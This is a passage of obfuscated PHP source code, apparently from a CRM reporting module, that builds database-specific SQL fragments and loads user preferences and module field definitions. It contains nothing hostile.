LENGTH($this->ZZZZZZZL1111) ";}} class ZZZZZZZZJ99 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;protected $ZO1414;protected $Zl11;function __construct($ZZZZZZZL1111, $ZO1414, $Zl11) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;$this->ZO1414 = $ZO1414;$this->Zl11 = $Zl11;} function ZZZZZZZu20() {return " MID({$this->ZZZZZZZL1111}, {$this->ZO1414}, {$this->Zl11}) ";}} class ZZZZZZZZK1010 implements ZZZZZZZt19 {protected $ZZZZZZZT1919;protected $ZZn13;function __construct($ZZZZZZZT1919, $ZZn13) {$this->ZZZZZZZT1919 = $ZZZZZZZT1919;$this->count = $ZZn13;} function ZZZZZZZu20() {return " LIMIT {$this->ZZZZZZZT1919}, {$this->count} ";}} class ZZZZZZZZL1111 {static function getInstance($ZZZZZZZV2121, $ZZZZZZZW2222) {switch($ZZZZZZZV2121) {case 'DATE': return new ZZZZZZZZM1212($ZZZZZZZW2222);break;case 'WEEK': return new ZZZZZZZZN1313($ZZZZZZZW2222);break;case 'YEAR': return new ZZZZZZZZO1414($ZZZZZZZW2222);break;case 'MONTH': return new ZZZZZZZZP1515($ZZZZZZZW2222);break;case 'QUARTER': return new ZZZZZZZZQ1616($ZZZZZZZW2222);break;case 'HOUR': return new ZZZZZZZZR1717($ZZZZZZZW2222);break;case 'MINUTE': return new ZZZZZZZZS1818($ZZZZZZZW2222);break;case 'SECOND': return new ZZZZZZZZT1919($ZZZZZZZW2222);break;case 'MICROSECOND': return new ZZZZZZZZU2020($ZZZZZZZW2222);break;}}} class ZZZZZZZZM1212 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " DATE({$this->ZZZZZZZL1111}) ";}} class ZZZZZZZZV2121 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;protected $value;protected $type;function __construct($ZZZZZZZL1111, $value, $type) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;$this->value = $value;$this->type = $type;} function ZZZZZZZu20() {if($this->value < 0) {$this->value = abs($this->value);return " DATE_SUB({$this->ZZZZZZZL1111}, INTERVAL {$this->value} {$this->type}) ";} else {return " DATE_ADD({$this->ZZZZZZZL1111}, INTERVAL {$this->value} {$this->type}) ";}}} class ZZZZZZZZW2222 implements ZZZZZZZt19 {function ZZZZZZZu20() {return "NOW()";}} class ZZZZZZZZN1313 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " WEEK({$this->ZZZZZZZL1111}) ";}} class ZZZZZZZZO1414 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " YEAR({$this->ZZZZZZZL1111}) ";}} class ZZZZZZZZP1515 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " MONTH({$this->ZZZZZZZL1111}) ";}} class ZZZZZZZZQ1616 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " QUARTER({$this->ZZZZZZZL1111}) ";}} class ZZZZZZZZR1717 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " HOUR({$this->ZZZZZZZL1111}) ";}} class ZZZZZZZZS1818 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " MINUTE({$this->ZZZZZZZL1111}) ";}} class ZZZZZZZZT1919 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " SECOND({$this->ZZZZZZZL1111}) ";}} class ZZZZZZZZU2020 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;function __construct($ZZZZZZZL1111) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;} function ZZZZZZZu20() {return " MICROSECOND({$this->ZZZZZZZL1111}) ";}} class ZZZZZZZZX2323 implements ZZZZZZZt19 {protected $Zu20;protected $value;function __construct($Zu20, $value = null) {$this->key = $Zu20;$this->value = $value;} function ZZZZZZZu20() {if($this->key == 'names') {return "SET {$this->key} {$this->value};";} else {return "SET {$this->key} = {$this->value};";}}} class ZZZZZZZZY2424 implements ZZZZZZZt19 {protected $ZZZZZZZL1111;protected $ZZZZZZZZk10;protected $ZZZZZZZZl11;function __construct($ZZZZZZZL1111, $ZZZZZZZZk10, $ZZZZZZZZl11) {$this->ZZZZZZZL1111 = $ZZZZZZZL1111;$this->ZZZZZZZZk10 = $ZZZZZZZZk10;$this->ZZZZZZZZl11 = $ZZZZZZZZl11;} function ZZZZZZZu20() {return "CONVERT_TZ({$this->ZZZZZZZL1111}, \"{$this->ZZZZZZZZk10}\", \"{$this->ZZZZZZZZl11}\")";}} class ZZZZZZZZZ2525 implements ZZZZZZZt19 {protected $r17;function __construct($r17, $type = false) {$this->r17 = $r17;} function ZZZZZZZu20() {return "{$this->r17}";}} class ZZZZZZZZZa0 implements ZZZZZZZt19 {protected $name;function __construct($name) {$this->name = $name;} function ZZZZZZZu20() {return "{$this->name}";}} class ZZZZZZZZZb1 implements ZZZZZZZt19 {protected $name;protected $query;function __construct($name, $query) {$this->name = $name;$this->query = $query;} function ZZZZZZZu20() {return "CREATE TEMPORARY TABLE IF NOT EXISTS {$this->name} AS {$this->query}";}} class ZZZZZZZZZc2 implements ZZZZZZZt19 {protected $name;function __construct($name) {$this->name = $name;} function ZZZZZZZu20() {return "DROP TEMPORARY TABLE IF EXISTS {$this->name}";}} class ZZZZZZZZZd3 implements ZZZZZZZt19 {protected $ZZZZZZZZv21;function __construct($ZZZZZZZZv21) {$this->ZZZZZZZZv21 = $ZZZZZZZZv21;} function ZZZZZZZu20() {return "{$this->ZZZZZZZZv21}";}} class ZZZZZZZZZe4 implements ZZZZZZZt19 {function __construct() {} function ZZZZZZZu20() {return "CURDATE()";}} class ZZZZZZZZZf5 implements ZZZZZZZt19 {protected $ZZZZZZZZx23;protected $type;protected $ZZZZZZZZy24;protected $ZZZZZZZZz25;function __construct($ZZZZZZZZx23="+", $type="day", $ZZZZZZZZz25, $ZZZZZZZZy24) {$this->ZZZZZZZZx23 = $ZZZZZZZZx23;$this->type = $type;$this->ZZZZZZZZz25 = $ZZZZZZZZz25;$this->ZZZZZZZZy24 = $ZZZZZZZZy24;} function ZZZZZZZu20() {return "$this->ZZZZZZZZy24 {$this->ZZZZZZZZx23} INTERVAL {$this->ZZZZZZZZz25} {$this->type}";}} class ZZZZZZZZZg6 implements ZZZZZZZt19 {protected $ZZZZZZZZB11;function __construct($ZZZZZZZZB11) {$this->ZZZZZZZZB11 = $ZZZZZZZZB11;} function ZZZZZZZu20() {return " COLLATE {$this->ZZZZZZZZB11} ";}}
;class ZZZZZZZa0 {static function ZZZZZZZG66($type) {if(PlatformConnector::ZZZZZZw22() == "mysql") {return ZZZZZZZZC22::getType($type);} else {return ZZZZZZZv21::getType($type);}} static function ZZZZZZZm12($r17) {return '0x'.strtoupper(bin2hex($r17));} static function ZZZZZZZn13() {if(PlatformConnector::ZZZZZZw22() == "mysql") {return ZZZZZZZZD33::ZZZZZZZn13();} else {return ZZZZZZZx23::ZZZZZZZn13();}} static function quote($ZZJ99) {if(PlatformConnector::ZZZZZZw22() == "mysql") {return ZZZZZZZZD33::quote($ZZJ99);} else {return ZZZZZZZx23::quote($ZZJ99);}} static function ZZZZZZZy24($ZZZm12) {if(PlatformConnector::ZZZZZZw22() == "mysql") {return ZZZZZZZZD33::ZZZZZZZy24($ZZZm12);} else {return ZZZZZZZx23::ZZZZZZZy24($ZZZm12);}} static function ZZZZZZZz25($ZZZm12) {if(PlatformConnector::ZZZZZZw22() == "mysql") {return ZZZZZZZZD33::ZZZZZZZz25($ZZZm12);} else {return ZZZZZZZx23::ZZZZZZZz25($ZZZm12);}} static function ZZZZZZZZZh7(array $ZZZV2121) {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = new ZZZZZZZZF55($ZZZV2121);} else {$ZZZZZZt19 = new ZZZZZZZB11($ZZZV2121);} return $ZZZZZZt19->ZZZZZZZu20();} static function ZZZZZZZb1($ZZZZZZZD33, $ZZZZZZZE44, $ZZZZZZZF55) {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = new ZZZZZZZZG66($ZZZZZZZD33, $ZZZZZZZE44, $ZZZZZZZF55);} else {$ZZZZZZt19 = new ZZZZZZZC22($ZZZZZZZD33, $ZZZZZZZE44, $ZZZZZZZF55);} return $ZZZZZZt19->ZZZZZZZu20();} static function ZZZZZZZZZi8($ZZZZZZZL1111, array $ZZZZZn13) {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = new ZZZZZZZZH77($ZZZZZZZL1111, $ZZZZZn13);} else {$ZZZZZZt19 = new ZZZZZZZK1010($ZZZZZZZL1111, $ZZZZZn13);} return $ZZZZZZt19->ZZZZZZZu20();} static function ZZZZZZZZZj9($ZZZZZZZL1111) {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = new ZZZZZZZZI88($ZZZZZZZL1111);} else {$ZZZZZZt19 = new ZZZZZZZQ1616($ZZZZZZZL1111);} return $ZZZZZZt19->ZZZZZZZu20();} static function ZZZZZZZZZk10($ZZZZZZZL1111, $ZO1414, $Zl11) {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = new ZZZZZZZZJ99($ZZZZZZZL1111, $ZO1414, $Zl11);} else {$ZZZZZZt19 = new ZZZZZZZR1717($ZZZZZZZL1111, $ZO1414, $Zl11);} return $ZZZZZZt19->ZZZZZZZu20();} static function ZZZZZZZr17($ZZZZZZZT1919, $ZZn13) {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = new ZZZZZZZZK1010($ZZZZZZZT1919, $ZZn13);} else {$ZZZZZZt19 = new ZZZZZZZS1818($ZZZZZZZT1919, $ZZn13);} return $ZZZZZZt19->ZZZZZZZu20();} static function ZZZZZZZZZl11($ZZZZZZZV2121, $ZZZZZZZW2222) {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = ZZZZZZZZL1111::getInstance($ZZZZZZZV2121, $ZZZZZZZW2222);} else {$ZZZZZZt19 = ZZZZZZZU2020::getInstance($ZZZZZZZV2121, $ZZZZZZZW2222);} return $ZZZZZZt19->ZZZZZZZu20();} static function getDate($ZZZZZZZL1111) {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = new ZZZZZZZZM1212($ZZZZZZZL1111);} else {$ZZZZZZt19 = new ZZZZZZZX2323($ZZZZZZZL1111);} return $ZZZZZZt19->ZZZZZZZu20();} static function ZZZZZZZZZm12($ZZZZZZZL1111, $value, $type) {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = new ZZZZZZZZV2121($ZZZZZZZL1111, $value, $type);} else {$ZZZZZZt19 = new ZZZZZZZZg6($ZZZZZZZL1111, $value, $type);} return $ZZZZZZt19->ZZZZZZZu20();} static function ZZZZZZZZZn13() {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = new ZZZZZZZZW2222();} else {$ZZZZZZt19 = new ZZZZZZZZh7();} return $ZZZZZZt19->ZZZZZZZu20();} static function ZZZZZZZZZo14($ZZZZZZZL1111) {return self::ZZZZZZZZZl11("WEEK", $ZZZZZZZL1111);} static function ZZZZZZZZZp15($ZZZZZZZL1111) {return self::ZZZZZZZZZl11("YEAR", $ZZZZZZZL1111);} static function ZZZZZZZZZq16($ZZZZZZZL1111) {return self::ZZZZZZZZZl11("MONTH", $ZZZZZZZL1111);} static function ZZZZZZZZZr17($ZZZZZZZL1111) {return self::ZZZZZZZZZl11("QUARTER", $ZZZZZZZL1111);} static function ZZZZZZZZZs18($ZZZZZZZL1111) {return self::ZZZZZZZZZl11("HOUR", $ZZZZZZZL1111);} static function ZZZZZZZZZt19($ZZZZZZZL1111) {return self::ZZZZZZZZZl11("MINUTE", $ZZZZZZZL1111);} static function ZZZZZZZZZu20($ZZZZZZZL1111) {return self::ZZZZZZZZZl11("SECOND", $ZZZZZZZL1111);} static function ZZZZZZZZZv21($ZZZZZZZL1111) {return self::ZZZZZZZZZl11("MICROSECOND", $ZZZZZZZL1111);} static function ZZZZZZZZZw22() {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = new ZZZZZZZZZe4();} else {$ZZZZZZt19 = new ZZZZZZZZn13();} return $ZZZZZZt19->ZZZZZZZu20();} static function ZZZZZZZZZx23($ZZZZZZZZx23, $type, $ZZZZZZZZz25, $ZZZZZZZZy24) {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = new ZZZZZZZZZf5($ZZZZZZZZx23, $type, $ZZZZZZZZz25, $ZZZZZZZZy24);} else {$ZZZZZZt19 = new ZZZZZZZZw22($ZZZZZZZZx23, $type, $ZZZZZZZZz25, $ZZZZZZZZy24);} return $ZZZZZZt19->ZZZZZZZu20();} static function ZZZZZZZZZy24($Zu20, $value = null) {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = new ZZZZZZZZX2323($Zu20, $value);} else {$ZZZZZZt19 = new ZZZZZZZZi8($Zu20, $value);} return $ZZZZZZt19->ZZZZZZZu20();} static function ZZZZZZZZZz25($ZZZZZZZL1111, $ZZZZZZZZk10, $ZZZZZZZZl11) {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = new ZZZZZZZZY2424($ZZZZZZZL1111, $ZZZZZZZZk10, $ZZZZZZZZl11);} else {$ZZZZZZt19 = new ZZZZZZZZj9($ZZZZZZZL1111, $ZZZZZZZZk10, $ZZZZZZZZl11);} return $ZZZZZZt19->ZZZZZZZu20();} static function ZZZZZZZZZA00($r17, $type = false) {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = new ZZZZZZZZZ2525($r17, $type);} else {$ZZZZZZt19 = new ZZZZZZZJ99($r17, $type);} return $ZZZZZZt19->ZZZZZZZu20();} static function ZZZZZZZZZB11($name) {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = new ZZZZZZZZZa0($name);} else {$ZZZZZZt19 = new ZZZZZZZZo14($name);} return $ZZZZZZt19->ZZZZZZZu20();} static function ZZZZZZZZZC22($name, $query) {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = new ZZZZZZZZZb1($name, $query);} else {$ZZZZZZt19 = new ZZZZZZZZp15($name, $query);} return $ZZZZZZt19->ZZZZZZZu20();} static function ZZZZZZZZZD33($name) {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = new ZZZZZZZZZc2($name);} else {$ZZZZZZt19 = new ZZZZZZZZr17($name);} return $ZZZZZZt19->ZZZZZZZu20();} static function ZZZZZZZZZE44($ZZZZZZZZB11) {if(PlatformConnector::ZZZZZZw22() == "mysql") {$ZZZZZZt19 = new ZZZZZZZZZg6($ZZZZZZZZB11);} else {$ZZZZZZt19 = new ZZZZZZZZA00($ZZZZZZZZB11);} return $ZZZZZZt19->ZZZZZZZu20();}}
;class ARUser
{protected $id;protected $ZZZX2323 = false;protected $dateFormat = 'yyyy-mm-dd';protected $ZZZZZZg6 = 24;protected $ZZZZZZO1414 = 'UTC';protected $numberPreferences = array('format' => '123,456,789', 'seperator' => '', 'decimal' => '.',);protected $ZZZZZZZZZF55 = '';protected $name = '';protected $ZZZZZZZZZG66 = array();function __construct(array $ZZZx23 = array()) {$this->ZZZZZZZZZH77($ZZZx23);} function ZZZZZZZZZH77(array $ZZZx23 = array()) {if(isset($ZZZx23['id'])) {$this->id = $ZZZx23['id'];} if(isset($ZZZx23['isAdmin'])) {$this->ZZZX2323 = $ZZZx23['isAdmin'];} if(isset($ZZZx23['numberPreferences'])) {$this->numberPreferences = $ZZZx23['numberPreferences'];} if(isset($ZZZx23['dateFormat'])) {$this->dateFormat = $ZZZx23['dateFormat'];} if(isset($ZZZx23['hourFormat'])) {$this->ZZZZZZg6 = $ZZZx23['hourFormat'];} if(isset($ZZZx23['timeZone'])) {$this->ZZZZZZO1414 = $ZZZx23['timeZone'];} if(isset($ZZZx23['email'])) {$this->ZZZZZZZZZF55 = $ZZZx23['email'];} if(isset($ZZZx23['name'])) {$this->name = $ZZZx23['name'];} if(isset($ZZZx23['roleIds'])) {$this->ZZZZZZZZZG66 = $ZZZx23['roleIds'];}} function ZZZZZZC22() {return $this->id;} function ZZZZU2020() {return $this->ZZZX2323;} function ZZZZZZZZZI88() {return $this->dateFormat;} function ZZZZZZZZZJ99() {return $this->ZZZZZZg6;} function ZZZZZZZZZK1010() {return $this->numberPreferences;} function getTimeZone() {return $this->ZZZZZZO1414;} function ZZZZZZZZZL1111() {return $this->ZZZZZZZZZF55;} function ZZZZZZZZZM1212() {return $this->name;} function ZZZZZZZZZN1313() {return $this->ZZZZZZZZZG66;} function ZZZZZZZZZO1414(){$ZZZZZZZZZP1515 = get_object_vars($this);return $ZZZZZZZZZP1515;}}
;class ZZZZZZZZZQ1616 {private $moduleName;private $ZZY2424;private $ZZZc2 = array();private $descriptor;private $ZZZZZZZZZR1717;private $ZZZg6 = -1;function __construct() {} function ZZZZZZZZZS1818() {return $this->moduleName;} function ZZZZZZZZZT1919($moduleName) {$this->moduleName = $moduleName;} function ZZZZZZZZZU2020() {return $this->ZZZc2;} function ZZZZZZZZZV2121() {$prefix = "m";$ZZZc2 = $this->ZZZZZZZZZU2020();$ZZZZZZZZZW2222 = array();$ZZT1919 = count($ZZZc2);$ZZZZS1818 = new ZZZZT1919();for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$ZZZc2[$Zf5]['fieldname_org'] = $ZZZc2[$Zf5]['fieldname'];$ZZZc2[$Zf5]['fieldname'] = $prefix.$this->ZZZZZZZZZX2323()."_".$this->moduleName."_".$ZZZc2[$Zf5]['fieldname'];$ZZZc2[$Zf5]['fieldlabel'] = $ZZZZS1818->ZZZZZk10($ZZZc2[$Zf5]['fieldlabel'],$this->moduleName);$ZZZc2[$Zf5]['module'] = $this->ZZZZZZZZZX2323();$ZZZZZZZZZW2222[$ZZZc2[$Zf5]['fieldname']] = $ZZZc2[$Zf5];} return $ZZZZZZZZZW2222;} function ZZZZZZZZZY2424($ZZZc2) {$this->ZZZc2 = $ZZZc2;} function ZZZZZZZZZZ2525() {return $this->ZZY2424;} function ZZZZZZZZZZa0($ZZY2424) {$this->ZZY2424 = $ZZY2424;} function ZZZZZZZZZZb1() {return $this->descriptor;} function ZZZZZZZZZZc2($descriptor) {$this->descriptor = $descriptor;} function ZZZZZZZZZZd3() {return $this->ZZZZZZZZZR1717;} function ZZZZZZZZZZe4($ZZZZZZZZZR1717) {$this->ZZZZZZZZZR1717 = $ZZZZZZZZZR1717;} function ZZZZZZZZZX2323() {if($this->ZZZg6 === -1){throw new Exception("Module number not defined!");} return $this->ZZZg6;} function ZZZZZZZZZZf5($ZZZg6) {$this->ZZZg6 = $ZZZg6;} function ZZZZZZZZZZg6($name, $value) {$ZZZc2 = array();foreach ($this->ZZZZZZZZZU2020() as $field) {if (isset($field[$name]) && $field[$name] == $value) {$ZZZc2[] = $field;}} return $ZZZc2;} function ZZZZZZZZZZh7($name, $value) {$ZZZc2 = $this->ZZZZZZZZZZg6($name, $value);if (empty($ZZZc2)) {return false;} return $ZZZc2[0];}}
;class ZZZZZZZZZZi8 {private $ZZZZZZZZZZj9;function __construct($ZZZZZZZZZZj9) {for ($Zf5 = 0, $ZZZZZZZZZZk10 = count($ZZZZZZZZZZj9);$Zf5 < $ZZZZZZZZZZk10;$Zf5++) {$ZZZZZZZZZZl11 = ZZZZZZZZZZm12::ZZZb1($ZZZZZZZZZZj9[$Zf5]);$ZZZZZZZZZZl11->ZZZZZZZZZZf5($Zf5);$this->ZZZZZZZZZZj9[] = $ZZZZZZZZZZl11;}} function ZZZZZZ2525() {return $this->ZZZZZZZZZZj9;} function ZZZZZZZZZU2020(){$ZZZc2 = array();foreach ($this->ZZZZZZZZZZj9 as $module) {$ZZZc2 = array_merge($ZZZc2, $module->ZZZZZZZZZV2121());} return $ZZZc2;}}
;class ZZZZZZZZZZm12{private static $ZZZZZZZZZZn13 = false;private static $ZZZZZZZZZZj9 = array();public static function ZZZb1($moduleName, $ZZZq16=false){if(ZZZZZZZZZZm12::$ZZZZZZZZZZn13 === false){ZZZZZZZZZZm12::$ZZZZZZZZZZn13 = ZZZZZZZZZZo14::load('definitions', 'modules');} if(isset(ZZZZZZZZZZm12::$ZZZZZZZZZZj9[$moduleName])){return ZZZZZZZZZZm12::$ZZZZZZZZZZj9[$moduleName];} $module = new ZZZZZZZZZQ1616();$module->ZZZZZZZZZT1919($moduleName);$ZZZc2 = ZZZZZZZZZZm12::ZZW2222($moduleName, $ZZZq16);$module->ZZZZZZZZZY2424($ZZZc2);$ZZZZZZZZZZp15 = ZZZZZZZZZZm12::ZZZZZZZZZZq16($moduleName);$module->ZZZZZZZZZZa0($ZZZZZZZZZZp15->table_name);$module->ZZZZZZZZZZc2($ZZZZZZZZZZp15);$module->ZZZZZZZZZZe4(ZZZZZZZZZZm12::ZZZr17($moduleName, $ZZZc2));ZZZZZZZZZZm12::$ZZZZZZZZZZj9[$moduleName] = $module;return $module;} private static function ZZW2222($module, $ZZZq16 = false){$ZZZ2525 = array();if(isset(ZZZZZZZZZZm12::$ZZZZZZZZZZn13[$module]) && isset(ZZZZZZZZZZm12::$ZZZZZZZZZZn13[$module]['fields'])){return ZZZZZZZZZZm12::$ZZZZZZZZZZn13[$module]['fields'];} $ZZZa0 = PlatformConnector::ZZZb1($module);if(!$ZZZa0) {return false;} $ZZY2424 = $ZZZa0->getTableName();$ZZZc2 = $ZZZa0->getFieldDefinitions();foreach($ZZZc2 as $field) {if(!isset($field['vname'])) {continue;} $ZZZd3 = ZZZZZZZZZZm12::ZZX2323($ZZY2424, $field, $ZZZq16);if($ZZZd3) {$ZZZ2525[] = $ZZZd3;}} if($module == 'oqc_Service') {$ZZZ2525[] = array('tablename' => "oqc_service", 'columnname' => "quantity * #alias#.price", 'fieldname' => "netprice", 'fieldlabel' => "LBL_NET_PRICE", 'uitype' => 'float', 'typeofdata' => 'N~M',);} return $ZZZ2525;} private static function ZZZZZZZZZZq16($module){$ZZS1818 = null;if(isset(ZZZZZZZZZZm12::$ZZZZZZZZZZn13[$module]) && isset(ZZZZZZZZZZm12::$ZZZZZZZZZZn13[$module]['tab_name_index'])){$ZZS1818 = array('tab_name_index' => ZZZZZZZZZZm12::$ZZZZZZZZZZn13[$module]['tab_name_index'], 'table_name' => ZZZZZZZZZZm12::$ZZZZZZZZZZn13[$module]['table_name'], 'table_index' => ZZZZZZZZZZm12::$ZZZZZZZZZZn13[$module]['table_index']);} $ZZZZZq16 = ($ZZS1818)? ((object) $ZZS1818): ($ZZS1818);if(!$ZZZZZq16){$ZZZZZq16 = PlatformConnector::ZZZb1($module);$ZZZZZt19 = 'id';$ZZS1818 = array('table_index' => $ZZZZZt19, 'table_name' => $ZZZZZq16->table_name, 'tab_name_index' => array(array('name' => $ZZZZZq16->table_name, 'idCol' => $ZZZZZt19), array('name' => $ZZZZZq16->table_name."_cstm", 'idCol' => $ZZZZZt19."_c")));} $ZZZZZq16 = ($ZZS1818)? ((object) $ZZS1818): ($ZZS1818);return $ZZZZZq16;} private static function ZZZr17($module, $ZZZc2){$ZZZs18 = array();$ZZZZZZZZZZr17 = array();foreach ($ZZZc2 as $field) {$ZZZZZZZZZZr17[$field['block']][] = $field;} foreach ($ZZZZZZZZZZr17 as $ZZZZZZZZZZs18 => $ZZZZZZZZZZt19) {$ZZZZZl11 = "---";$ZZZt19 = array('id' => $ZZZZZZZZZZs18, 'label' => $ZZZZZl11, 'fields' => $ZZZZZZZZZZt19,);$ZZZs18[] = $ZZZt19;} return $ZZZs18;} private static function ZZX2323($ZZY2424, $field, $ZZZq16=false) {$ZZZ2525 = array('tablename' => $ZZY2424, 'columnname' => $field['name'], 'fieldname' => $field['name'], 'fieldlabel' => $field['vname'], 'uitype' => $field['type'], 'typeofdata' => 'V~O', 'block' => '1',);if($field['name'] == 'id' && $ZZY2424 == 'users'){$ZZZ2525['uitype'] = 'assigned_user_name';$ZZZ2525['related_module'] = 'Users';$ZZZ2525['table'] = 'users';$ZZZ2525['id_name'] = 'id';$ZZZ2525['rname'] = 'user_name';} if(isset($field['audited'])){$ZZZ2525['audited'] = $field['audited'];} if(isset($field['function'])){$ZZZ2525['function'] = $field['function'];} if(isset($field['function_bean'])){$ZZZ2525['function_bean'] = $field['function_bean'];} if(isset($field['dbType'])) {$ZZZ2525['dbType'] = $field['dbType'];} if(isset($field['options'])) {$ZZZ2525['options'] = $field['options'];} if($field['type'] == 'link') {return false;} if(isset($field['source'])) {if(in_array($field['source'], array('non-db'))) {return false;} if($field['source'] == 'custom_fields') {$ZZZ2525['tablename'] = $ZZZ2525['tablename'] . '_cstm';}} if($ZZZq16){return $ZZZ2525;} if($field['vname'] == '') {return false;} if($field['type'] == 'relate') {if(!isset($field['module'])) {return false;} $ZZZ2525['related_module'] = $field['module'];$ZZZ2525['id_name'] = $field['id_name'];if(isset($field['table'])) {$ZZZ2525['table'] = $field['table'];} if(isset($field['rname'])) {$ZZZ2525['rname'] = $field['rname'];}} if($field['type'] == 'assigned_user_name') {$ZZZ2525['related_module'] = 'Users';$ZZZ2525['table'] = 'users';$ZZZ2525['id_name'] = 'id';if(isset($field['rname'])) {$ZZZ2525['rname'] = $field['rname'];}} return $ZZZ2525;}}
;;global $current_user;date_default_timezone_set(TimeDate::userTimezone($current_user));class ZZZZZZZZZZu20{public $name;public $joinType;public $joinTable1;public $joinField1;public $joinTable2;public $joinField2;public $joinModule;public $manyToManyTable;public $sourceIndex;public $targetIndex;public $roleIndex;public $roleValue;function __construct($name, $joinType, $joinField1, $joinField2, $joinTable1, $joinTable2, $joinModule, $manyToManyTable = false, $sourceIndex = false, $targetIndex = false, $roleIndex = false, $roleValue = false) {$this->joinField1 = $joinField1;$this->joinField2 = $joinField2;$this->joinTable1 = $joinTable1;$this->joinTable2 = $joinTable2;$this->joinType = $joinType;$this->name = $name;$this->joinModule = $joinModule;$this->manyToManyTable = $manyToManyTable;$this->sourceIndex = $sourceIndex;$this->targetIndex = $targetIndex;$this->roleIndex = $roleIndex;$this->roleValue = $roleValue;}}
class ZZZZZZZZZZv21{protected $db;protected $ZZZZS1818;protected $ZZZZZZZZZZw22;protected $ZZZZZx23 = array();protected $isCombined = false;function __construct($ZZZZZZZZZZw22, $ZZZZZx23, ZZp15 $db, ZZZZT1919 $ZZZZS1818, $isCombined = false){$this->db = $db;$this->ZZZZS1818 = $ZZZZS1818;if($ZZZZZZZZZZw22){$this->ZZZZZZZZZZw22 = new ZZZZZZZZZZx23($ZZZZZZZZZZw22,$this->db,$this->ZZZZS1818);}else{$this->ZZZZZZZZZZw22 = false;} $ZZT1919 = count($ZZZZZx23);$this->isCombined = $isCombined;for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$this->ZZZZZx23[] = new ZZZZZZZZZZy24($ZZZZZx23[$Zf5]->name,$this->db,$this->ZZZZS1818,$ZZZZZx23[$Zf5]);}} function ZZZZZZZZZZz25($module){$ZZS1818 = $this->ZZZZS1818->ZZZZZk10($module->name,$module->name);if($this->isCombined){if($module->relationDescr->joinModule >0){$ZZS1818 = $this->ZZZZZZZZZZz25($this->ZZZZZx23[$module->relationDescr->joinModule-1])."-".$ZZS1818;}elseif($this->ZZZZZZZZZZw22){$ZZS1818 = $this->ZZZZS1818->ZZZZZk10($this->ZZZZZZZZZZw22->name,$this->ZZZZZZZZZZw22->name)."-".$ZZS1818;}} return $ZZS1818;} function ZZZZZZZZZZA00($module){return $ZZZZZZZZZZB11 = "(".$this->ZZZZZZZZZZz25($module).") ";} function ZZZZZZZZZZC22(){$ZZS1818 = array();if($this->ZZZZZZZZZZw22){$this->ZZZZZZZZZZw22->fieldTitlePrefix = "(".$this->ZZZZS1818->ZZZZZk10($this->ZZZZZZZZZZw22->name,$this->ZZZZZZZZZZw22->name).") ";$ZZS1818 = $this->ZZZZZZZZZZw22->ZZZZZZZZZZC22();} $ZZT1919 = count($this->ZZZZZx23);for($Zf5 = 0;$Zf5<$ZZT1919;$Zf5++){$this->ZZZZZx23[$Zf5]->prefix = ($Zf5+1)."_".$this->ZZZZZx23[$Zf5]->name."_";$this->ZZZZZx23[$Zf5]->fieldTitlePrefix = $this->ZZZZZZZZZZA00($this->ZZZZZx23[$Zf5]);$ZZZZZq16 = $this->ZZZZZx23[$Zf5]->ZZZZZZZZZZC22();$ZZS1818 = array_merge($ZZS1818,$ZZZZZq16);} return $ZZS1818;} function ZZZZZZZZZZD33($ZZZZZZZZZZE44,$ZZZZZZZZZZF55){$ZZS1818 = array();if($this->ZZZZZZZZZZw22){$ZZS1818 = $this->ZZZZZZZZZZw22->ZZZZZZZZZZC22();} $ZZT1919 = count($this->ZZZZZx23);for($Zf5 = 